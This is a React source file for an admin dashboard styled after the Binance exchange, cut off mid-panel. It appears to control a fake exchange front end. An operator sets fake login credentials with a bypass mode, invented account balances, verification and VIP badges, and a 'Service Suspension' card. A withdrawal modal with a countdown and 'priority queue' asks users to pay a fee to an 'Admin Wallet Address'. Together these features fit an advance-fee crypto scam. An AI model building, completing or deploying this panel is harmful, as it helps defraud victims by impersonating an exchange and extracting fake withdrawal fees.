import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';
import { X, Download, Upload, RefreshCw, Copy, Check } from 'lucide-react';

interface Toast {
  id: string;
  title: string;
  message: string;
  isError?: boolean;
}

export default function AdminDashboard() {
  const navigate = useNavigate();
  const { 
    adminState, 
    updateAuth, 
    updateProfile, 
    updateBalance, 
    updateWithdrawalModal, 
    updatePendingPage,
    exportAllData,
    importAllData,
    resetAllData,
  } = useApp();

  const [activeTab, setActiveTab] = useState('auth');
  const [toasts, setToasts] = useState<Toast[]>([]);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [importData, setImportData] = useState('');
  const [showImportModal, setShowImportModal] = useState(false);

  const { auth, profile, balance, withdrawalModal, pendingPage } = adminState;

  // Form states
  const [formState, setFormState] = useState({
    password: auth.password,
    verificationCode: auth.verificationCode,
    testMode: auth.testMode,
    profilePhoto: profile.photo,
    profileName: profile.name,
    userId: profile.userId,
    isVip: profile.isVip,
    isVerified: profile.isVerified,
    cryptoAmount: balance.cryptoAmount,
    cryptoSymbol: balance.cryptoSymbol,
    fiatAmount: balance.fiatAmount,
    fiatSymbol: balance.fiatSymbol,
    titleTemplate: withdrawalModal.titleTemplate,
    scrollableMessage: withdrawalModal.scrollableMessage,
    priorityQueueTitle: withdrawalModal.priorityQueueTitle,
    priorityQueueDescription: withdrawalModal.priorityQueueDescription,
    networkDisplayName: withdrawalModal.networkDisplayName,
    adminWalletAddress: withdrawalModal.adminWalletAddress,
    feeAmount: withdrawalModal.feeAmount,
    countdownDuration: withdrawalModal.countdownDuration,
    primaryButtonText: withdrawalModal.primaryButtonText,
    secondaryButtonText: withdrawalModal.secondaryButtonText,
    pendingTitle: pendingPage.title,
    messageLine1: pendingPage.messageLine1,
    messageLine2: pendingPage.messageLine2,
    pendingCountdownDuration: pendingPage.countdownDuration,
    okButtonText: pendingPage.okButtonText,
  });

  function showToast(title: string, message: string, isError = false) {
    const id = Math.random().toString(36).substring(2, 9);
    setToasts(prev => [...prev, { id, title, message, isError }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 3000);
  }

  function updateFormState(key: string, value: string | boolean | number) {
    setFormState(prev => ({ ...prev, [key]: value }));
  }

  function saveChanges() {
    updateAuth({
      password: formState.password,
      verificationCode: formState.verificationCode,
      testMode: formState.testMode,
    });
    updateProfile({
      photo: formState.profilePhoto,
      name: formState.profileName,
      userId: formState.userId,
      isVip: formState.isVip,
      isVerified: formState.isVerified,
    });
    updateBalance({
      cryptoAmount: formState.cryptoAmount,
      cryptoSymbol: formState.cryptoSymbol,
      fiatAmount: formState.fiatAmount,
      fiatSymbol: formState.fiatSymbol,
    });
    updateWithdrawalModal({
      titleTemplate: formState.titleTemplate,
      scrollableMessage: formState.scrollableMessage,
      priorityQueueTitle: formState.priorityQueueTitle,
      priorityQueueDescription: formState.priorityQueueDescription,
      networkDisplayName: formState.networkDisplayName,
      adminWalletAddress: formState.adminWalletAddress,
      feeAmount: formState.feeAmount,
      countdownDuration: formState.countdownDuration,
      primaryButtonText: formState.primaryButtonText,
      secondaryButtonText: formState.secondaryButtonText,
    });
    updatePendingPage({
      title: formState.pendingTitle,
      messageLine1: formState.messageLine1,
      messageLine2: formState.messageLine2,
      countdownDuration: formState.pendingCountdownDuration,
      okButtonText: formState.okButtonText,
    });
    showToast('Success', 'All changes saved successfully');
  }

  function handleExport() {
    const data = exportAllData();
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `binance-admin-config-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
    showToast('Exported', 'Configuration saved to file');
  }

  function handleImport() {
    if (!importData.trim()) {
      showToast('Error', 'Please paste data to import', true);
      return;
    }
    const success = importAllData(importData);
    if (success) {
      showToast('Success', 'Configuration imported successfully');
      setShowImportModal(false);
      setImportData('');
      window.location.reload();
    } else {
      showToast('Error', 'Failed to import configuration', true);
    }
  }

  function handleReset() {
    if (confirm('Are you sure you want to reset all settings to defaults?')) {
      resetAllData();
      showToast('Reset', 'All settings reset to defaults');
      window.location.reload();
    }
  }

  async function copyAddress() {
    try {
      await navigator.clipboard.writeText(formState.adminWalletAddress);
      setCopiedAddress(true);
      setTimeout(() => setCopiedAddress(false), 2000);
      showToast('Copied', 'Address copied to clipboard');
    } catch {
      showToast('Error', 'Failed to copy address', true);
    }
  }

  function logout() {
    navigate('/dash');
  }

  const tabs = [
    { id: 'auth', label: 'Authentication', icon: '🔐' },
    { id: 'profile', label: 'Profile', icon: '👤' },
    { id: 'balance', label: 'Balance', icon: '💰' },
    { id: 'withdrawal', label: 'Withdrawal Modal', icon: '💸' },
    { id: 'pending', label: 'Pending Page', icon: '⏳' },
    { id: 'settings', label: 'Settings', icon: '⚙️' },
  ];

  return (
    <div className="min-h-screen bg-[#0B0E11] text-[#EAECEF] font-['Inter',sans-serif] relative overflow-x-hidden">
      {/* Grid Background */}
      <div 
        className="fixed inset-0 pointer-events-none z-0"
        style={{
          backgroundImage: 'linear-gradient(rgba(240, 185, 11, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(240, 185, 11, 0.03) 1px, transparent 1px)',
          backgroundSize: '50px 50px'
        }}
      />

      {/* Toast Notifications */}
      <div className="fixed bottom-4 right-4 left-4 sm:left-auto z-50 flex flex-col gap-2">
        {toasts.map(toast => (
          <div 
            key={toast.id}
            className={`transform transition-all duration-300 ${toast.isError ? 'border-red-500/30' : 'border-[#F0B90B]/30'} bg-[#1E2329] border rounded-lg px-4 py-3 shadow-2xl flex items-center gap-3`}
          >
            <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${toast.isError ? 'bg-red-500/20' : 'bg-[#F0B90B]/20'}`}>
              {toast.isError ? (
                <X className={`w-4 h-4 ${toast.isError ? 'text-red-500' : 'text-[#F0B90B]'}`} />
              ) : (
                <Check className="w-4 h-4 text-[#F0B90B]" />
              )}
            </div>
            <div>
              <p className="text-sm font-medium text-white">{toast.title}</p>
              <p className="text-xs text-[#848E9C]">{toast.message}</p>
            </div>
          </div>
        ))}
      </div>

      {/* Import Modal */}
      {showImportModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-[#1E2329] border border-[#474D57] rounded-2xl p-6 w-full max-w-lg">
            <h3 className="text-lg font-semibold text-white mb-4">Import Configuration</h3>
            <textarea
              value={importData}
              onChange={(e) => setImportData(e.target.value)}
              placeholder="Paste your JSON configuration here..."
              className="w-full h-48 bg-[#151A20] border border-[#474D57] rounded-lg p-3 text-sm text-white font-mono resize-none focus:outline-none focus:border-[#F0B90B]"
            />
            <div className="flex gap-3 mt-4">
              <button 
                onClick={() => setShowImportModal(false)}
                className="flex-1 py-2.5 rounded-lg border border-[#474D57] text-[#EAECEF] hover:border-[#F0B90B] transition-colors"
              >
                Cancel
              </button>
              <button 
                onClick={handleImport}
                className="flex-1 py-2.5 rounded-lg bg-[#F0B90B] text-[#0B0E11] font-semibold hover:bg-[#F8D12F] transition-colors"
              >
                Import
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="relative z-10 border-b border-gray-800 bg-[#0B0E11]/80 backdrop-blur-md sticky top-0">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-3 sm:py-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-[#F0B90B] to-yellow-600 rounded-lg flex items-center justify-center shadow-lg shadow-yellow-500/20">
              <svg className="w-6 h-6 text-[#0B0E11]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/>
              </svg>
            </div>
            <div>
              <h1 className="text-lg sm:text-xl font-bold text-white tracking-tight">Admin Dashboard</h1>
              <p className="text-xs text-[#848E9C]">System Control Center</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2 sm:gap-3 flex-wrap justify-center">
            <div className="flex items-center gap-2 px-3 py-1.5 sm:px-4 sm:py-2 rounded-full bg-[#1E2329] border border-[#474D57]">
              <span className={`w-2 h-2 rounded-full ${formState.testMode ? 'bg-[#0ECB81] shadow-[0_0_8px_#0ECB81]' : 'bg-[#F6465D] shadow-[0_0_8px_#F6465D]'}`}></span>
              <span className={`text-xs sm:text-sm font-medium ${formState.testMode ? 'text-[#F0B90B]' : 'text-[#F6465D]'}`}>
                {formState.testMode ? 'Test Mode Active' : 'Secure Mode'}
              </span>
            </div>
            <button onClick={handleExport} className="px-3 py-2 rounded-lg border border-[#474D57] text-[#EAECEF] hover:border-[#F0B90B] transition-colors flex items-center gap-2 text-sm">
              <Download className="w-4 h-4" />
              <span className="hidden sm:inline">Export</span>
            </button>
            <button onClick={() => setShowImportModal(true)} className="px-3 py-2 rounded-lg border border-[#474D57] text-[#EAECEF] hover:border-[#F0B90B] transition-colors flex items-center gap-2 text-sm">
              <Upload className="w-4 h-4" />
              <span className="hidden sm:inline">Import</span>
            </button>
            <button onClick={logout} className="px-4 py-2 rounded-lg bg-[#F0B90B] text-[#0B0E11] font-semibold hover:bg-[#F8D12F] transition-colors text-sm">
              Logout
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 max-w-[1600px] mx-auto p-4 sm:p-6">
        {/* Tabs */}
        <div className="flex flex-wrap gap-2 mb-6">
          {tabs.map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${
                activeTab === tab.id 
                  ? 'bg-[#F0B90B] text-[#0B0E11]' 
                  : 'bg-[#1E2329] text-[#848E9C] hover:text-white border border-[#474D57]'
              }`}
            >
              <span className="mr-1">{tab.icon}</span>
              {tab.label}
            </button>
          ))}
        </div>

        {/* Tab Content */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
          {/* Authentication Panel */}
          {activeTab === 'auth' && (
            <div className="lg:col-span-2 bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg bg-[#F0B90B]/10 flex items-center justify-center">
                    <svg className="w-5 h-5 text-[#F0B90B]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                    </svg>
                  </div>
                  <h2 className="text-lg font-semibold text-white">Authentication Control</h2>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-[#848E9C] uppercase tracking-wider hidden sm:inline">Test Mode</span>
                  <button
                    onClick={() => updateFormState('testMode', !formState.testMode)}
                    className={`w-12 h-6 rounded-full relative transition-colors ${formState.testMode ? 'bg-[#F0B90B]' : 'bg-[#474D57]'}`}
                  >
                    <span className={`absolute top-1 w-4 h-4 bg-white rounded-full transition-transform ${formState.testMode ? 'left-7' : 'left-1'}`} />
                  </button>
                </div>
              </div>
              
              <div className="space-y-4">
                <div>
                  <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Valid Password</label>
                  <input
                    type="text"
                    value={formState.password}
                    onChange={(e) => updateFormState('password', e.target.value)}
                    className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] focus:shadow-[0_0_0_3px_rgba(240,185,11,0.1)] transition-all"
                  />
                </div>
                <div>
                  <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Valid Verification Code</label>
                  <input
                    type="text"
                    value={formState.verificationCode}
                    onChange={(e) => updateFormState('verificationCode', e.target.value)}
                    className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] focus:shadow-[0_0_0_3px_rgba(240,185,11,0.1)] transition-all"
                  />
                </div>
                <div className="flex items-center justify-between p-3 rounded-lg bg-[#151A20] border border-[#474D57]">
                  <span className="text-sm text-[#848E9C]">Current Status</span>
                  <span className={`text-sm font-medium ${formState.testMode ? 'text-[#F0B90B]' : 'text-[#0ECB81]'}`}>
                    {formState.testMode ? 'Bypass Enabled' : 'Secure Mode'}
                  </span>
                </div>
              </div>
            </div>
          )}

          {/* Profile Panel */}
          {activeTab === 'profile' && (
            <>
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center">
                    <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
                    </svg>
                  </div>
                  <h2 className="text-lg font-semibold text-white">Profile Control</h2>
                </div>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Profile Photo URL</label>
                    <input
                      type="text"
                      value={formState.profilePhoto}
                      onChange={(e) => updateFormState('profilePhoto', e.target.value)}
                      placeholder="https://..."
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Profile Name</label>
                      <input
                        type="text"
                        value={formState.profileName}
                        onChange={(e) => updateFormState('profileName', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">User ID</label>
                      <input
                        type="text"
                        value={formState.userId}
                        onChange={(e) => updateFormState('userId', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      onClick={() => updateFormState('isVip', !formState.isVip)}
                      className="flex items-center justify-between p-3 rounded-lg bg-[#151A20] border border-[#474D57] cursor-pointer hover:border-[#F0B90B] transition-colors"
                    >
                      <span className="text-sm text-[#848E9C]">Account Type</span>
                      <span className={`text-sm font-medium ${formState.isVip ? 'text-[#F0B90B]' : 'text-[#848E9C]'}`}>
                        {formState.isVip ? 'VIP' : 'Regular'}
                      </span>
                    </button>
                    <button
                      onClick={() => updateFormState('isVerified', !formState.isVerified)}
                      className="flex items-center justify-between p-3 rounded-lg bg-[#151A20] border border-[#474D57] cursor-pointer hover:border-[#F0B90B] transition-colors"
                    >
                      <span className="text-sm text-[#848E9C]">Verification</span>
                      <span className={`text-sm font-medium ${formState.isVerified ? 'text-[#0ECB81]' : 'text-[#F6465D]'}`}>
                        {formState.isVerified ? 'Verified' : 'Unverified'}
                      </span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Profile Preview */}
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <p className="text-xs text-[#848E9C] uppercase tracking-wider mb-4">Live Preview</p>
                <div className="bg-gradient-to-br from-[#1E2329] to-[#151A20] border border-[rgba(240,185,11,0.2)] rounded-xl p-4 flex items-center gap-4">
                  <div className="w-14 h-14 rounded-full bg-gradient-to-br from-[#F0B90B] to-yellow-600 flex items-center justify-center text-[#0B0E11] font-bold text-xl overflow-hidden flex-shrink-0">
                    {formState.profilePhoto ? (
                      <img src={formState.profilePhoto} alt="" className="w-full h-full object-cover" />
                    ) : (
                      formState.profileName.split(' ').map(n => n[0]).join('').toUpperCase()
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <h3 className="font-semibold text-white truncate">{formState.profileName}</h3>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${formState.isVip ? 'bg-[#F0B90B] text-[#0B0E11]' : 'bg-[#474D57] text-white'}`}>
                        {formState.isVip ? 'VIP' : 'Regular'}
                      </span>
                    </div>
                    <p className="text-xs text-[#848E9C] font-mono mt-0.5 truncate">ID: {formState.userId}</p>
                    <div className="flex items-center gap-2 mt-2">
                      {formState.isVerified && (
                        <svg className="w-3 h-3 text-[#0ECB81] flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
                        </svg>
                      )}
                      <span className={`text-xs ${formState.isVerified ? 'text-[#0ECB81]' : 'text-[#F6465D]'}`}>
                        {formState.isVerified ? 'Verified' : 'Unverified'}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Balance Panel */}
          {activeTab === 'balance' && (
            <>
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center">
                    <svg className="w-5 h-5 text-[#0ECB81]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                  </div>
                  <h2 className="text-lg font-semibold text-white">Balance Control</h2>
                </div>
                
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Crypto Amount</label>
                      <input
                        type="text"
                        value={formState.cryptoAmount}
                        onChange={(e) => updateFormState('cryptoAmount', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Crypto Symbol</label>
                      <input
                        type="text"
                        value={formState.cryptoSymbol}
                        onChange={(e) => updateFormState('cryptoSymbol', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                  </div>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="col-span-2">
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Fiat Amount</label>
                      <input
                        type="text"
                        value={formState.fiatAmount}
                        onChange={(e) => updateFormState('fiatAmount', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Symbol</label>
                      <select
                        value={formState.fiatSymbol}
                        onChange={(e) => updateFormState('fiatSymbol', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all appearance-none"
                      >
                        <option value="$">$ USD</option>
                        <option value="€">€ EUR</option>
                        <option value="£">£ GBP</option>
                        <option value="¥">¥ JPY</option>
                      </select>
                    </div>
                  </div>
                </div>
              </div>

              {/* Balance Preview */}
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <p className="text-xs text-[#848E9C] uppercase tracking-wider mb-4">Service Suspension Card Preview</p>
                <div className="bg-gradient-to-br from-[#1E2329] to-[#151A20] border border-[rgba(240,185,11,0.2)] rounded-xl p-5 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-[#F0B90B]/5 rounded-full blur-3xl -mr-10 -mt-10"></div>
                  <div className="relative z-10">
                    <p className="text-xs text-[#848E9C] mb-1">Total Balance</p>
                    <div className="flex items-baseline gap-2 mb-3 flex-wrap">
                      <span className="text-2xl sm:text-3xl font-bold text-white">{formState.fiatSymbol}{formState.fiatAmount}</span>
                    </div>
                    <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-[#0B0E11]/50 border border-[#474D57]/50 w-fit">
                      <svg className="w-4 h-4 text-[#F0B90B] flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                      </svg>
                      <span className="text-sm font-mono text-[#F0B90B] font-medium">{formState.cryptoAmount} {formState.cryptoSymbol}</span>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Withdrawal Modal Panel */}
          {activeTab === 'withdrawal' && (
            <>
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 rounded-lg bg-purple-500/10 flex items-center justify-center">
                    <svg className="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/>
                    </svg>
                  </div>
                  <h2 className="text-lg font-semibold text-white">Withdrawal Modal Control</h2>
                </div>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Title Template (use [AMOUNT])</label>
                    <input
                      type="text"
                      value={formState.titleTemplate}
                      onChange={(e) => updateFormState('titleTemplate', e.target.value)}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Scrollable Message</label>
                    <textarea
                      value={formState.scrollableMessage}
                      onChange={(e) => updateFormState('scrollableMessage', e.target.value)}
                      rows={3}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] resize-none focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Priority Queue Title</label>
                    <input
                      type="text"
                      value={formState.priorityQueueTitle}
                      onChange={(e) => updateFormState('priorityQueueTitle', e.target.value)}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Priority Queue Description</label>
                    <input
                      type="text"
                      value={formState.priorityQueueDescription}
                      onChange={(e) => updateFormState('priorityQueueDescription', e.target.value)}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Network Display Name</label>
                    <input
                      type="text"
                      value={formState.networkDisplayName}
                      onChange={(e) => updateFormState('networkDisplayName', e.target.value)}
                      className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Admin Wallet Address</label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={formState.adminWalletAddress}
                        onChange={(e) => updateFormState('adminWalletAddress', e.target.value)}
                        className="flex-1 bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] font-mono text-sm focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                      <button
                        onClick={copyAddress}
                        className="px-3 rounded-lg border border-[#474D57] text-[#EAECEF] hover:border-[#F0B90B] transition-colors"
                      >
                        {copiedAddress ? <Check className="w-5 h-5 text-[#0ECB81]" /> : <Copy className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>
                  <div className="grid grid-cols-3 gap-4">
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Fee Amount</label>
                      <input
                        type="text"
                        value={formState.feeAmount}
                        onChange={(e) => updateFormState('feeAmount', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Countdown (sec)</label>
                      <input
                        type="number"
                        value={formState.countdownDuration}
                        onChange={(e) => updateFormState('countdownDuration', parseInt(e.target.value) || 0)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                    <div>
                      <label className="block text-xs text-[#848E9C] uppercase tracking-wider mb-2">Primary Button</label>
                      <input
                        type="text"
                        value={formState.primaryButtonText}
                        onChange={(e) => updateFormState('primaryButtonText', e.target.value)}
                        className="w-full bg-[#151A20] border border-[#474D57] rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* Modal Preview */}
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <p className="text-xs text-[#848E9C] uppercase tracking-wider mb-4">Modal Preview</p>
                <div className="bg-[rgba(11,14,17,0.95)] rounded-2xl border border-[rgba(240,185,11,0.3)] p-6 max-w-sm mx-auto">
                  <div className="w-12 h-12 rounded-full bg-[#F0B90B]/20 flex items-center justify-center mx-auto mb-4">
                    <span className="text-[#F0B90B] text-2xl font-bold">!</span>
                  </div>
                  <p className="text-center text-sm text-gray-300 mb-4 leading-relaxed">
                    {formState.titleTemplate.replace('[AMOUNT]', '0.521 BTC').split(/(\d+\.?\d* \w+)/).map((part, i) => 
                      /\d+\.?\d* \w+/.test(part) ? <span key={i} className="text-[#F6465D]">{part}</span> : part
                    )}
                  </p>
                  <div className="flex flex-col sm:flex-row gap-3">
                    <button className="flex-1 py-2.5 rounded-lg border border-[#474D57] text-sm font-medium text-[#848E9C]">
                      {formState.secondaryButtonText}
                    </button>
                    <button className="flex-1 py-2.5 rounded-lg bg-[#F0B90B] text-[#0B0E11] text-sm font-bold">
                      {formState.primaryButtonText}
                    </button>
                  </div>
                </div>
              </div>
            </>
          )}

          {/* Pending Page Panel */}
          {activeTab === 'pending' && (
            <>
              <div className="bg-[rgba(30,35,41,0.6)] backdrop-blur-xl border border-[rgba(240,185,11,0.1)] rounded-2xl p-4 sm:p-6 hover:border-[rgba(240,185,11,0.3)] transition-all">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center">
                    <svg className="w-5 h-5 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                  </div>
                  <h2 className="text-lg font-semibold text-white">Pending Page Control</h2>
                </div>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs text-[#F0B90B] uppercase tracking-wider mb-2">Success Title (Yellow)</label>
                    <input
                      type="text"
                      value={formState.pendingTitle}
                      onChange={(e) => updateFormState('pendingTitle', e.target.value)}
                      className="w-full bg-[#151A20] border border-[#F0B90B]/50 rounded-lg px-4 py-3 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B] transition-all"
                    />
                  </div>
                  <div>
